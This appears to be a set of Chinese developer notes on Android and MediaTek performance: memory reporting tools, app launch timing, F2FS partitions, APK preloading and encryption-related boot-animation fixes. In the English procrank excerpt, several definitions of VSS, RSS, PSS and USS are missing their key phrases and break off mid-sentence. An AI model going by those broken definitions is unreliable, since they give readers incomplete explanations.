                Code:     7400
               Stack:       44
            Graphics:     5351
       Private Other:     3696
              System:    19810
 
               TOTAL:    48473       TOTAL SWAP PSS:     2447
 
 Objects
               Views:      376         ViewRootImpl:        3
         AppContexts:        5           Activities:        0
              Assets:        7        AssetManagers:        0
       Local Binders:      156        Proxy Binders:       55
       Parcel memory:       20         Parcel count:      110
    Death Recipients:        2      OpenSSL Sockets:        0
            WebViews:        0
 
 SQL
         MEMORY_USED:        0
  PAGECACHE_OVERFLOW:        0          MALLOC_SIZE:        0


PSS TOTAL:              内存锁实际占用的值
Dalvik Heap Alloc:      Runtime.totalMemory() - Runtime.freeMemory(), Dalvik Heap 分配的内存大小
Dalvik Heap Free:       Runtime.freeMemory()  获得，DalvikHeap 剩余的内存大小
Dalvik Heap size:       Runtime.totalMemory() 获得，DalvikHeap 总共的内存大小 = Heap Alloc + Heap Free
.so mmap                C库代码占用的内存
.jar mmap               Java文件代码占用的内存
.apk mmap               apk代码占用的内存
.ttf mmap               ttf文件代码占用的内存
.dex mmap               dex文件代码占用的内存
Other mmap              其他文件占用的内存
Cursor                  /dev/ashmem/Curxor Cursor消耗的内存(KB)
Ashmem                  /dev/ashmem，匿名共享内存用来提供共享内存通过分配一个或多个进程可以共享的带名称的内存块
Other dev               /dev/,内部driver占用的在 Other dev
```

## [CMD]  [性能] showmap

```text bash
adb shell showmap ${pid}

https://blog.csdn.net/youth0532/article/details/74010569

实际上是读取 /proc/pid/smap 文件

源代码：
system/extras/showmap/showmap.c
```

## [CMD]  [性能] procrank

```text bash
VSS - Virtual Set Size 虚拟耗用内存（包含共享库占用的内存）
RSS - Resident Set Size 实际使用物理内存（包含共享库占用的内存）
PSS - Proportional Set Size 实际使用的物理内存（比例分配共享库占用的内存）
USS - Unique Set Size 进程独自占用的物理内存（不包含共享库占用的内存）
一般来说内存占用大小有如下规律：VSS >= RSS >= PSS >= USS

VSS：VSS表示一个进程可訪问的所有内存地址空间的大小。

这个大小包含了进程已经申请但尚未使用的内存空间。在实际中非常少用这样的方式来表示进程占用内存的情况，用它来表示单个进程的内存使用情况是不准确的。
RSS：表示一个进程在RAM中实际使用的空间地址大小。包含了所有共享库占用的内存。这样的表示进程占用内存的情况也是不准确的。
PSS：表示一个进程在RAM中实际使用的空间地址大小，它按比例包括了共享库占用的内存。假如有3个进程使用同一个共享库，那么每一个进程的PSS就包括了1/3大小的共享库内存。

这样的方式表示进程的内存使用情况较准确。但当仅仅有一个进程使用共享库时，其情况和RSS一模一样。
USS：表示一个进程本身占用的内存空间大小，不包括其他不论什么成分，这是表示进程内存大小的最好方式！

Overview

The aim of this post is to provide information that will assist in interpreting memory reports from various tools so the true memory usage for Linux processes and the system can be determined.

Android has a tool called procrank (/system/xbin/procrank), which lists out the memory usage of Linux processes in order from highest to lowest usage. The sizes reported per process are VSS, RSS, PSS, and USS.

For the sake of simplicity in this description, memory will be expressed in terms of pages, rather than bytes. Linux systems like ours manage memory in 4096 byte pages at the lowest level.

VSS (reported as VSZ from ps) is . This size also includes memory that may not be resident in RAM like mallocs that have been allocated but not written to. VSS is of very little use for determing real memory usage of a process.

RSS is the. RSS can be misleading, because it reports the total all of the shared libraries that the process uses, even though a shared library is only loaded into memory once regardless of how many processes use it. RSS is not an accurate representation of the memory usage for a single process.

PSS , i.e. if three processes all use a shared library that has 30 pages, that library will only contribute 10 pages to the PSS that is reported for each of the three processes. PSS is a very useful number because when the PSS for all processes in the system are summed together, that is a good representation for the total memory usage in the system. When a process is killed, the shared libraries that contributed to its PSS will be proportionally distributed to the PSS totals for the remaining processes still using that library. In this way PSS can be slightly misleading, because when a process is killed, PSS does not accurately represent the memory returned to the overall system.

USS is . USS is an extremely useful number because it indicates the true incremental cost of running a particular process. When a process is killed, the USS is the total memory that is actually returned to the system. USS is the best number to watch when initially suspicious of memory leaks in a process.

For systems that have Python available, there is also a nice tool called smem that will report memory statistics including all of these categories.
```

## [CMD]  [性能] free命令查看剩余可用空间

```text bash
free 命令显示系统使用和空闲的内存情况，包括物理内存、交互区内存(swap)和内核缓冲区内存。
            total        used        free      shared     buffers
Mem:        441946112   432463872     9482240     1175552     1437696
-/+ buffers/cache:      431026176    10919936
Swap:       331452416    91521024   239931392
```

## [性能]  [CMD] ActivityManager查看应用启动时间

```text
adb logcat -b events | grep wm_activity_launch_time

11-18 11:22:00.347   800   824 I wm_activity_launch_time: [0,45478996,com.android.mms/.ui.ConversationList,1091,1391] 

ThisTime : 1091，最后一个有界面Activity的启动时间

TotalTime : 1391，从无界面Activity到最后一个有界面Activity的启动时间

我们来解释下代码里curTime、displayStartTime、mLaunchStartTime三个时间变量.

curTime表示该函数调用的时间点.

displayStartTime表示一连串启动Activity中的最后一个Activity的启动时间点.

mLaunchStartTime表示一连串启动Activity中第一个Activity的启动时间点.

正常情况下点击桌面图标只启动一个有界面的 Activity，此时 displayStartTime 与mLaunchStartTime 便指向同一时间点，此时 ThisTime=TotalTime。另一种情况是点击桌面图标应用会先启动一个无界面的 Activity 做逻辑处理，接着又启动一个有界面的Activity，在这种启动一连串 Activity 的情况下（知乎的启动就是属于这种情况），displayStartTime 便指向最后一个 Activity 的开始启动时间点，mLaunchStartTime 指向第一个无界面Activity的开始启动时间点，此时 ThisTime！=TotalTime。

https://www.imooc.com/article/50479?block_id=tuijian_wz
```

## [性能]  [CMD] 堆栈dump

```text
adb shell kill -3
输出的trace会保存在 /data/anr/traces.txt文件中。这个需要注意，如果没有 /data/anr/这个目录 或/data/anr/traces.txt这个文件，需要手工创建一下，并设置好读写权限。如果是native thread的堆栈打印，可能需要修改dalvik/vm/Thread.cpp的dumpNativeThread方法。
```

## [性能] reserve memory 查看和详情

```text
https://online.mediatek.com/FAQ#/SW/FAQ21499
一个固定的内存，通过proc/meminfo 发现total memory 并不是全部的内存，那剩下的的内存如何查看?
都是做了什么?
 
部分kernel代码、modem ,  tee,  framebuffer 等都会占用一部分的内存

MTK 有相关内容的记录
k71v1_64_bsp:/proc/mtk_memcfg # ls
memory_layout reserve_memory total_reserve
 
k71v1_64_bsp:/proc/mtk_memcfg # cat reserve_memory
*mblock-15-ccci: 80412672
mblock-9-dtb_kernel_addr_mb: 524288
ram_console-reserved-memory@54400000: 65536
pstore-reserved-memory@54410000: 917504
minirdump-reserved-memory@544f0000: 65536
mblock-4-atf-reserved: 262144
mblock-7-pl-bootarg: 2097152  // pl 
mblock-8-lk_addr_mb: 4194304 // lk 
reserve-memory-dram_r0_dummy_read: 4096
mblock-12-SPM-reserved: 65536
mblock-10-framebuffer: 29229056  //framebuffer
mblock-6-SSPM-reserved: 786432
mblock-3-log_store: 262144  // log 
*mblock-16-ccci: 23068672  // modem
*mblock-14-ccci: 1048576
reserve-memory-scp_share: 20971520
reserve-memory-sspm_share: 5308416
mblock-13-SCP-reserved: 6291456
consys-reserve-memory: 2097152
mblock-11-vpu_binary: 44105728
mblock-5-atf-log-reserved: 262144
mblock-1-dramc-rk0: 4096
mblock-2-dramc-rk1: 4096
kernel(text): 13340672
kernel(data): 14116716
kernel(page): 67108800
kernel(other): 12486868

k71v1_64_bsp:/proc/mtk_memcfg # cat total_reserve
321388 kB
 
321388 kB = 321388 /1024 =  313 MB
 
totoal  meminfo 
 
k71v1_64_bsp:/proc/mtk_memcfg # cat /proc/meminfo
MemTotal: 3872916 kB
MemFree: 119676 kB
MemAvailable: 2269012 kB
Buffers: 218348 kB
 
MemTotal: 3872916 kB =  3872916  / 1024  = 3782.14 MB
 
4G =4096MB - 313 MB = 3783M
 
physics RAM = Total meminfo + total_reserve
```

## [FAQ09948]  [性能] Performance 问题的排查方法（如开机慢、系统卡顿等）

```text
请参考《Performance_Tuning_Customer_Document》进行排查，相关客户文档可以在http://dcc.mediatek.com下载。
```

## [性能] apk安装包瘦身

```text
1.使用proguard混淆，规则是什么样的呢?
    a. 修改该模块的Android.mk文件，添加如下内容：
    LOCAL_PROGUARD_ENABLED := custom
    LOCAL_PROGUARD_FLAG_FILES := proguard.flags

    b. 编写一个文本文件，将其命名为proguard.flags，并将该文件放到与该模块的Android.mk相同的目录下；该文件开头部分内容需要填写：
    -dontpreverify
    -dontoptimize
    -keepattributes *Annotation*
    该文件其余部分根据模块的内容填写即可，文件格式可参考Codebase中其他proguard.flags文件(Codebase中有很多proguard.flags文件)

2.优化图片资源，使用 webp 或 9.png 格式

3.去掉一些没必要的分辨率

icon 图标使用 svg
icon状态区分使用 Tint 着色器
App内大图压缩,使用webp格式图片,我们可以通过 智图 或者isparta将其它格式的图片转换成webP格式，isparta可实现批量转换。
图片压缩：ImageOptim + ImageAlpha + TinyPNG

移除无用资源
资源打包设置:由于第三方库的引入,如appcompat-v7的引入库中包含了大量的国际化资源,可根据自身业务进行相应保留和删除。

defaultConfig { 
    applicationId "com.zthx.xianglian" 
    minSdkVersion 19 
    targetSdkVersion 28 
    versionCode 1 
    versionName "1.0.0" 
    testInstrumentationRunner "android.support.test.runner.AndroidJUnitRunner" 
    //只保留指定和默认的资源 
    resConfigs('zh-rCN','ko') 
}
动态库打包配置
开启代码混淆压缩
使用 protobuf 作为序列化数据, flatbuffers
LeakCanary是由Square公司开源的一款轻量的第三方检测内存泄露的工具
BlockCanary
Facebook redex压缩，优化

AndroidStudio使用lint清除无用的资源文件

参考资料
https://www.cnblogs.com/mengdd/p/reduce-size-of-android-app.html
https://blog.csdn.net/u013176138/article/details/78894538
https://blog.csdn.net/xJ032w2j4cCjhOW8s8/article/details/80174800
```

## TODO : [性能] 使用腾讯X5SDK优化webView加载

## [性能] 安卓Webview网页秒开策略探索

```text
https://juejin.im/post/5d2605f8f265da1bc23fa07c

痛点是什么?
网页加载缓慢，白屏，使用卡顿。
为何有这种问题?
1.调用loadUrl()方法的时候，才会开始网页加载流程
2.js臃肿问题
3.加载图片太多
4.webview本身问题
webiew是怎么加载网页的呢?
webview初始化->DOM下载→DOM解析→CSS请求+下载→CSS解析→渲染→绘制→合成
优化方向是?
1.webview本身优化

提前内核初始化
代码：

public class App extends Application {
    private WebView mWebView ;
    @Override
    public void onCreate() {
        super.onCreate();
        mWebView = new WebView(new MutableContextWrapper(this));
    }
}
```

## [性能] TextView 性能优化

```text
我们可以不用从SpannableStringBuilder转化到String。根据你的文本中是否包含链接，底层的TextView可能会复制一份你的字符串，这需要分配一些内存。
我们可以一直使用StaticLayout，这比DynamicLayout要稍微快一些。
我们可以避免使用TexView中其他的逻辑： 监听文本修改的逻辑，展示嵌入drawable的逻辑，绘制编辑器的逻辑以及弹出下拉列表的逻辑。

// 优化后的 StaticLayoutView
public class StaticLayoutView extends View {
    private Layout layout;
    private int width ;
    private int height;

    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
    public StaticLayoutView(Context context, AttributeSet attrs, int defStyleAttr, int defStyleRes) {
        super(context, attrs, defStyleAttr, defStyleRes);
    }

    public StaticLayoutView(Context context, AttributeSet attrs, int defStyleAttr) {
        super(context, attrs, defStyleAttr);
    }

    public StaticLayoutView(Context context, AttributeSet attrs) {
        super(context, attrs);
    }

    public StaticLayoutView(Context context) {
        super(context);
    }

    public void setLayout(Layout layout) {
        this.layout = layout;
        if (this.layout.getWidth() != width || this.layout.getHeight() != height) {
            width = this.layout.getWidth();
            height = this.layout.getHeight();
            requestLayout();
        }
    }

    @Override
    protected void onDraw(Canvas canvas) {
        super.onDraw(canvas);
        canvas.save();
        if (layout != null) {
            layout.draw(canvas, null, null, 0);
        }
        canvas.restore();
    }

    @Override
    protected void onLayout(boolean changed, int left, int top, int right, int bottom) {
        super.onLayout(changed, left, top, right, bottom);
    }

    @Override
    protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
        if (layout != null) {
            setMeasuredDimension(layout.getWidth(), layout.getHeight());
        } else {
            super.onMeasure(widthMeasureSpec, heightMeasureSpec);
        }
    }
}
```

## [性能] Android修改分区格式为F2FS

```text
本文介绍如何将Android系统的/data分区改变成F2FS格式。修改的原因是F2FS分区格式拥有更佳的I/O性能。

修改文件系统格式成F2FS方法
在改动之前我们先看看当前Android系统的主要分区格式,可以用如下方式查看

$ adb shell df -t ext4
Filesystem                             1K-blocks    Used Available Use% Mounted on
/dev/block/bootdevice/by-name/system     1007736  907964     83388  92% /system
/dev/block/bootdevice/by-name/userdata  12168972 6740960   5411628  56% /data
/dev/block/bootdevice/by-name/cache       259856     332    254160   1% /cache
/dev/block/bootdevice/by-name/persist      28144     200     27292   1% /persist

大多数情况下可以看到我们系统当前的主要分区格式都是EXT4。
现在来将/data分区格式更改成F2FS格式，因为应用的好多私有数据都存放在该分区知悉，比如database，SharedPreferences.更改成F2FS格式能有效提升应用的I/O访问速度，提升性能。 
修改的地方有三点：

１．打开kernel config中对F2FS的支持 
项目的kernel　config 文件中加入

CONFIG_F2FS_FS=y
CONFIG_F2FS_STAT_FS=y
CONFIG_F2FS_FS_XATTR=y
CONFIG_F2FS_FS_POSIX_ACL=y
CONFIG_F2FS_FS_SECURITY=y
CONFIG_F2FS_CHECK_FS=y

２．配置/data分区文件格式为F2FS. 
在文件BoardConfig.mk中做如下修改

TARGET_USERIMAGES_USE_F2FS := true
BOARD_USERDATAIMAGE_FILE_SYSTEM_TYPE := f2fs

３．更改分区文件fstab，使得mount /data分区时的文件类型为F2FS。 
fstab可能有多个类似文件，需要根据具体项目定位。修改形式大致如下:

- /data     ext4        noatime,nosuid,nodev,discard
+ /data     f2fs        noatime,nosuid,nodev,discard

第３点的修改可以参考： 
https://github.com/anpage/android_device_asus_grouper/commit/9d6899d95af972ae7613d02dc30eb36bb74062b8

以上修改完毕，查看当前的/data分区已经变成了F2FS格式。

F2FS vs EXT4
修改了之后为了验证I/O性能确实提升了，可以借助Androbench APK测试。结果如下图。 

从跑分结果看f2fs格式的结果要好于ext4,但似乎优势不明显。我们在用dd命令测试： 

最后放上一个官方的分区格式不同的性能对比图。 

什么是文件系统： 
文件系统是用来控制如何存取数据的一套规则。如果没有这套规则，那么所有数据都会放在一个大的存储区域上，我们很难找到需要的数据位于该区域的哪一个地方。于是就制定了一套规则，它将整个大的存储区域分割成若干个独立的子区域，每个子区域对应一个名称，如何分割子区域，以及从子区域中读写目标数据的整套规则就是文件系统。
F2FS文件系统优缺点
F2FS (Flash-Friendly File System)文件系统格式是由三星公司开发的，它专为移动设备而生。 

优点：
卓越的读写速度
降低了写的的次数，因此延长了磁盘的寿命。

缺点:
占用的空间更大
没有ext4稳定
没有ext4通用，某些手机可能不支持
EXT4文件系统优缺点
EXT4是Linux的标准文件系统，它基于EXT3而来，EXT3又基于EXT2而来，但从EXT3到EXT4做的改动巨大。

优点：
良好的稳定性，使用广泛
所有的智能手机都支持。

缺点：
相对与F2FS　I/O速度较慢。
```

## [性能] 为什么 Android8.1 使用f2fs文件系统的预置app到data/app不行?

```text
https://blog.csdn.net/lb5761311/article/details/83617744

最近使用mtk6739平台开发。有一个需求是想预置系统中，恢复出厂设置后把app删除。
在 8.1 的流程是
在 package/apps/3rd-party 下面以需要预置的apk名字新建文件夹，以预置 facebook 为例。
将 facebook.apk 放到 package/apps/3rd-party/facebook 中。
在 package/apps/3rd-party/facebook 下面创建文件 Android.mk，文件内容如下
在 build/make/target/product/core.mk或device/mediatek/common/device.mk中添加PRODUCT_PACKAGES += facebook

LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)
LOCAL_MODULE := facebook
LOCAL_MODULE_TAGS := optional
LOCAL_SRC_FILES := $(LOCAL_MODULE).apk
LOCAL_MODULE_CLASS := APPS
LOCAL_MODULE_SUFFIX := $(COMMON_ANDROID_PACKAGE_SUFFIX)
LOCAL_CERTIFICATE := PRESIGNED

include $(BUILD_PREBUILT)

然后再下面文件添加facebook的包名
vendor/mediatek/proprietary/frameworks/base/data/etc/pms_sysapp_removable_system_list.txt
就可以完成卸载apk，但是这个做法有一个问题，恢复出厂设置facebook这个app有返回到桌面了。而我们设计需求是不能回到桌面。
这个方法不行。
第二种方法
需要预置apk，卸载以后，恢复出厂设置以后，apk不存在。这种需要预置apk到/data/app目录下。但是android o 版本以后google 加入了patch,不允许预置apk到data/app目录下，只允许使用adb install 的方式来安装apk到data/app目录下，需要将其roll back 回以前的版本，然后用下列方法可以完成预置。

diff --git a/services/core/java/com/android/server/pm/PackageManagerService.javab/services/core/java/com/android/server/pm/PackageManagerService.javaindex bafcad4…71d3d9a 100644
--- a/services/core/java/com/android/server/pm/PackageManagerService.java
+++ b/services/core/java/com/android/server/pm/PackageManagerService.java
@@ -11394,6 +11394,10 @@
                                     + " but expected at " + known.codePathString
                                     + "; ignoring.");
                         }
+                    } else {
+                        throw new PackageManagerException(INSTALL_FAILED_INVALID_INSTALL_LOCATION,
+                                "Application package " + pkg.packageName
+                                + " not found; ignoring.");
                     }
                 }
             }
在PMS中将其中增加的代码删除。
2.在 packages/apps 下面以需要预置的 APK 名字创建文件夹，以预置一个名为Test的APK为例
3.将 Test.apk 放到 packages/apps/Test
4.在 packages/apps/Test 下面创建文件 Android.mk，文件内容如下：

LOCAL_PATH := $(call my-dir)
include $(CLEAR_VARS)
# Module name should match apk name to be installed
LOCAL_MODULE := Test
LOCAL_MODULE_TAGS := optional
LOCAL_SRC_FILES := $(LOCAL_MODULE).apk
LOCAL_MODULE_CLASS := APPS
LOCAL_MODULE_SUFFIX := $(COMMON_ANDROID_PACKAGE_SUFFIX)
# LOCAL_PRIVILEGED_MODULE := true
LOCAL_MODULE_PATH := $(TARGET_OUT_DATA_APPS)
LOCAL_CERTIFICATE := platform
include $(BUILD_PREBUILT)

5.打开文件 device\mediatek\common\device.mk

将 Test 添加到 PRODUCT_PACKAGES 里面。

PRODUCT_PACKAGES += Test
6.重新 build 整个工程
但是测试后发现 data/app 根本没有打包到userdata.img中。整个userdata.img大小 64K。
只能自己分析原因。
执行 生成userdata.img的命令 make userdataimage-nodeps

.PHONY: userdataimage-nodeps
userdataimage-nodeps: | $(INTERNAL_USERIMAGES_DEPS)
 $(build-userdataimage-target)

INTERNAL_USERIMAGES_DEPS 依赖 ，表示执行 生成userdata.img 需要哪些条件
这个命令 最终执行 build-userdataimage-target
内容如下：

define build-userdataimage-target
  $(call pretty,"Target userdata fs image: $(INSTALLED_USERDATAIMAGE_TARGET)")
  @mkdir -p $(TARGET_OUT_DATA)
  @mkdir -p $(userdataimage_intermediates) && rm -rf $(userdataimage_intermediates)/userdata_image_info.txt
  $(call generate-userimage-prop-dictionary, $(userdataimage_intermediates)/userdata_image_info.txt, skip_fsck=true)
  $(hide) PATH=$(foreach p,$(INTERNAL_USERIMAGES_BINARY_PATHS),$(p):)$$PATH \
      ./build/tools/releasetools/build_image.py \
      $(TARGET_OUT_DATA) $(userdataimage_intermediates)/userdata_image_info.txt $(INSTALLED_USERDATAIMAGE_TARGET) $(TARGET_OUT)
  $(hide) $(call assert-max-image-size,$(INSTALLED_USERDATAIMAGE_TARGET),$(BOARD_USERDATAIMAGE_PARTITION_SIZE))
endef

$(TARGET_OUT_DATA) = out/target/product/k39tv1_bsp_1g/data
$(userdataimage_intermediates) = out/target/product/k39tv1_bsp_1g/obj/PACKAGING/userdata_intermediates
make userdata 的log

PRODUCT_COPY_FILES device/mediatek/common/fstab.enableswap:root/fstab.enableswap ignored.
No private recovery resources for TARGET_DEVICE k39tv1_bsp_1g
[100% 1/1]  Target userdata fs image: out/target/product/k39tv1_bsp_1g/userdata.img
Target userdata fs image: out/target/product/k39tv1_bsp_1g/data
Running:  mkf2fsuserimg.sh out/target/product/k39tv1_bsp_1g/userdata.img 3221225472
in mkf2fsuserimg.sh PATH=out/host/linux-x86/bin/:/usr/lib/jvm/java-8-openjdk-amd64/bin:/home/stonecom/mtk6739/out/soong/host/linux-x86/bin:/home/stonecom/mtk6739/out/host/linux-x86/bin:/home/stonecom/mtk6739/prebuilts/gcc/linux-x86/arm/arm-linux-androideabi-4.9/bin::/home/stonecom/mtk6739/development/scripts:/home/stonecom/mtk6739/prebuilts/devtools/tools:/home/stonecom/mtk6739/external/selinux/prebuilts/bin:/home/stonecom/mtk6739/prebuilts/misc/linux-x86/dtc:/home/stonecom/mtk6739/prebuilts/misc/linux-x86/libufdt:/home/stonecom/mtk6739/prebuilts/android-emulator/linux-x86_64:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/home/stonecom/bin
make_f2fs -S 3221225472 out/target/product/k39tv1_bsp_1g/userdata.img

        F2FS-tools: mkfs.f2fs Ver: 1.8.0 (2017-02-03)

Info: Disable heap-based policy
Info: Debug level = 0
Info: Label = 
Info: Trim is disabled
Info: Segments per section = 1
Info: Sections per zone = 1
Info: sector size = 512
Info: total sectors = 6291456 (3072 MB)
Info: zone aligned segment0 blkaddr: 512
Info: format version with
  ""
Info: Overprovision ratio = 3.640%
Info: Overprovision segments = 115 (GC reserved = 62)
Info: format successful
out/target/product/k39tv1_bsp_1g/userdata.img maxsize=3288667008 blocksize=4224 total=57624 reserve=33221760

mkf2fsuserimg.sh 是生成 img脚本，地址在out/host/linux-x86/bin
内容：

#!/bin/bash
#
# To call this script, make sure make_f2fs is somewhere in PATH

function usage() {
cat<<EOT
Usage:
${0##*/} OUTPUT_FILE SIZE
EOT
}

echo "in mkf2fsuserimg.sh PATH=$PATH"

if [ $# -lt 2 ] ; then
  usage
  exit 1
fi

OUTPUT_FILE=$1
SIZE=$2
shift; shift


if [ -z $SIZE ] ; then
  echo "Need size of filesystem"
  exit 2
fi

MAKE_F2FS_CMD="make_f2fs -S $SIZE $OUTPUT_FILE"
echo $MAKE_F2FS_CMD
$MAKE_F2FS_CMD
if [ $? -ne 0 ] ; then
  exit 4
fi

里面最重要的内容就是这句话，
MAKE_F2FS_CMD=“make_f2fs -S $SIZE $OUTPUT_FILE”
$SIZE $OUTPUT_FILE = out/target/product/k39tv1_bsp_1g/userdata.img
make_f2fs 实际使用的命令是mkfs.f2fs ，这是f2fs文件系统的命令
mkfs.f2fs指令使用指南
-s只是指定了段大小。整个命令是生成一个空的userdata.img并指定img段大小。
所以只要使用了 f2fs无法预置data/app到userdata.img,可以修改userdata img 为ext4支持，希望以后f2fs以后能支持
```

## [性能] mtk平台上如何开启f2fs

```text
1、  MTK Android O1   SW 版本

2、  F2FS 在下列平台已经做了验证，其他平台没有验证
     1)6580/6570  
     2)6735/53/37 系列    
     3)6739

3.  开启f2fs :

 1)Kernel Config (kernel-xxx/arch/armxx/configs/$project_[debug] _config)
添加如下设定（如已有，请配置为如下设定）
CONFIG_F2FS_FS=y
CONFIG_F2FS_FS_SECURITY=y
CONFIG_F2FS_FS_ENCRYPTION=y
 
 2)add F2FS Property of MTK
device/mediateksample (mediatekprojects) / <Project Name> /device.mk
添加如下设定（如已有，请配置为如下设定）：
# F2FS filesystem
PRODUCT_PROPERTY_OVERRIDES += ro.mtk_f2fs_enable=1
 3)CONFIG data partition as F2FS as below
device/mediateksample (mediatekprojects) / <Project Name> /BoardConfig.mk
 添加如下设定（如已有，请配置为如下设定）：
#Config data partition for F2FS
BOARD_USERDATAIMAGE_FILE_SYSTEM_TYPE := f2fs

# This ensures the needed build tools are available.
# TODO: make non-linux builds happy with external/f2fs-tool; system/extras/f2fs_utils
ifeq ($(HOST_OS),linux)
TARGET_USERIMAGES_USE_F2FS := true
endif
# Filesystem management tools
PRODUCT_PACKAGES += fsck.f2fs mkfs.f2fs

4.vendor/mediatek/proprietary/bootable/bootloader/lk/project/
$project.mk (for fastboot)
Add the following line
MTK_USERIMAGES_USE_F2FS = yes
 
以上修改后，请make clean后编译，确保修改生效
```

## [知识点]  [性能] 加密方式优化FBE/FDE

```text
FBE(File-based encryption)
FDE(Full disk encryption)

从Android 6.0开始，谷歌向所有厂商发出要求，该系统的全盘加密要强制默认开启，对于用户来说，这是一件好事，因为这可以从更大程度上保护用户的安全。
开启全盘加密带来的问题也很明显，因为默认开启后，其将严重拖慢系统的读写性能。有媒体曾测试，开启了全盘加密随机读取性能下降了62.9%，随机写入性能下降了50.5%，有序读取性能的下降幅度达到了惊人的80.7%。


关于android9.0上开启了加密后，开机动画会播放两次的问题
android9.0上，开启了默认加密后，手机在开机的过程中，会发现开机动画在播放一会儿，突然黑屏或闪屏一下，然后重新播放，看起来像是手机ap端突然重启了一样的。针对这个问题，仔细分析后发现，这个不是手机ap端重启了，而是加密导致的framework重启。具体原因如下：

加密又分全盘加密（Android 4.4 引入）和文件级加密（Android 7.0 引入），本文将论述加密中的全盘加密的基本知识。全盘加密是使用已加密的密钥对 Android 设备上的所有用户数据进行编码的过程。设备经过加密后，所有由用户创建的数据在写入磁盘之前都会自动加密，并且所有读取操作都会在将数据返回给调用进程之前自动解密数据。

Android 全盘加密基于在块设备层运行的内核功能 dm-crypt。因此，这种加密方式适用于以块设备的形式呈现给内核的嵌入式多媒体卡 (eMMC) 和类似闪存设备。YAFFS 会直接与原始 NAND 闪存芯片交互，无法进行全盘加密。

全盘加密采用的是 128 位高级加密标准 (AES) 算法（搭配密码块链接 (CBC) 和 ESSIV:SHA256）。对主密钥进行加密时使用的是 128 位 AES 算法，并会调用 OpenSSL 库。对于该密钥，您必须使用 128 位或更多位（可以选择 256 位）。

加密操作由 init 和 vold 管理。 init 负责调用 vold，然后 vold 会设置相关属性以触发 init 中的事件。系统的其他部分也会查看这些属性以执行各项任务，例如报告状态、提示输入密码，或有严重错误发生时提示恢复出厂设置。为了调用 vold 中的加密功能，系统会使用命令行工具 vdc 的 cryptfs 命令：checkpw、restart、enablecrypto、changepw、cryptocomplete、verifypw、setfield、getfield、mountdefaultencrypted、getpwtype、getpw 以及 clearpw。

要加密、解密或清空 /data，/data 不得处于装载状态。但要显示任何界面，框架都必须启动，而框架需要 /data 才能运行。为了解决这一冲突，/data 上会装载一个临时文件系统。通过该文件系统，Android 可以提示输入密码、显示进度或根据需要建议清除数据。不过，该文件系统会带来以下限制：要从临时文件系统切换到实际的 /data 文件系统，系统必须停止临时文件系统中打开了文件的所有进程，并在实际的 /data 文件系统中重启这些进程。为此，所有服务都必须位于以下其中一个组内：core、main 和 late_start。

core：启动后一直不会关闭。
main：关闭，然后在用户输入磁盘密码后会重启。
late_start：在 /data 未解密并装载之前，一直不会启动。

加密流程和启动流程
使用 forceencrypt 加密新设备
这是 Android 5.0 以后设备首次启动时的常规流程。

检测带有 forceencrypt 标记的未加密文件系统，这个标记一般在fstab文件里设置，以高通的为例，放device/qcom/项目名/fstabs-4.9/fstab_non_AB_variant.qti文件里，比如userdata分区要加密，则用forceencrypt如下配置：

/dev/block/bootdevice/by-name/userdata      /data        ext4    noatime,nosuid,nodev,barrier=1,noauto_da_alloc,discard  wait,forceencrypt=footer,quota,reservedsize=128M

/data 未加密，但需要加密，因为 forceencrypt 强制要求进行此项加密。卸载 /data。

开始加密 /data

vold.decrypt = “trigger_encryption” 会触发 init.rc，从而使 vold 对 /data 进行无密码加密。（因为这应该是新设备，还没有设置密码。）

装载 tmpfs

vold 会装载一个 tmpfs /data（使用 ro.crypto.tmpfs_options 中的 tmpfs 选项），并会将 vold.encrypt_progress 属性设为 0。 vold 会准备 tmpfs /data 以便启动已加密的系统，并会将 vold.decrypt 属性设为 trigger_restart_min_framework

启动框架以显示进度，这里会开启第一次动画。

由于设备上几乎没有要加密的数据，加密过程很快就会完成，因此实际上通常并不会显示进度条。如需关于进度界面的更多详细信息，请参阅加密现有设备。

/data 加密后，关闭框架

vold 会将 vold.decrypt 设为 trigger_default_encryption，这会启动 defaultcrypto 服务。（这会启动以下流程来装载默认的已加密用户数据。）trigger_default_encryption 会检查加密类型，以了解 /data 加密是否使用了密码。由于 Android 5.0 设备是在首次启动时加密，应该没有设置任何密码，因此我们要解密并装载 /data。

装载 /data

接下来，init 会使用从 ro.crypto.tmpfs_options（在 init.rc 中设置）中选取的参数在 tmpfs RAMDisk 中装载 /data。

启动框架

将 vold 设为 trigger_restart_framework，这会继续常规启动过程，重新启动framework，开机动画也会重新再调一次。

这可以从system/core/rootdir/init.rc这个里面看到：

on property:vold.decrypt=trigger_restart_framework
    stop surfaceflinger
    start surfaceflinger
    # A/B update verifier that marks a successful boot.
    exec_start update_verifier
    class_start main
    class_start late_start

这里显示，当vold.decrypt的值为trigger_restart_framework时，会先stop surfaceflinger，然后start surfaceflinger

 现在的情形就是这样，如果要开启手机加密，则开机必定会跑两次framework，一次是在装载tmpfs/data时跑，另一次是在加密完成后，重新装载data后跑，这个流程是不可能被更改的。那么为了避免跑两次开机动画，就必须另想办法了。

我们可以在frameworks/native/services/surfaceflinger/SurfaceFlinger.cpp这个文件里做如下修改：

      char voldDecryptBuf[PROPERTY_VALUE_MAX] ;
      property_get("vold.decrypt", voldDecryptBuf, "");  
      ALOGI("xuhui bootanim cryptState is: %s ", voldDecryptBuf);
      if(strcmp(voldDecryptBuf, "trigger_restart_framework") == 0)
      {
        if (mStartPropertySetThread->Start() != NO_ERROR) {
            ALOGI("Run StartPropertySetThread failed!");
        }
      }

因为在开机加密完成后，vold一定会将"vold.decrypt"它的值设置为trigger_restart_framework，以便重新启动framework。这时会停止surfaceflinger进程，然衙再重启surfaceflinger进程。而我们的开机动画，是在这个进程里来启动的。我们可以从\frameworks\native\services\surfaceflinger\StartPropertySetThread.cpp这个文件里看到：

bool StartPropertySetThread::threadLoop() {
    // Set property service.sf.present_timestamp, consumer need check its readiness
    property_set(kTimestampProperty, mTimestampPropertyValue ? "1" : "0");
    // Clear BootAnimation exit flag
    property_set("service.bootanim.exit", "0");
    // Start BootAnimation if not started
    property_set("ctl.start", "bootanim");
    // Exit immediately
    return false;
}

